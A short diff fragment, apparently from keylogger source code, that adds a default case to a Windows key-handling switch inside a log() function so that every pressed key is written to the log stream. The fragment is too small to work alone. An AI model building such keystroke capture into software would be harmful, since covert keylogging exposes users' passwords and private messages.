@@ -146,6 +146,7 @@ void log()
 						case VK_CAPITAL:
 							write << "<CAPS LOCK>";
 						break;
+						default: write << key;
 					}
 				}
 			}
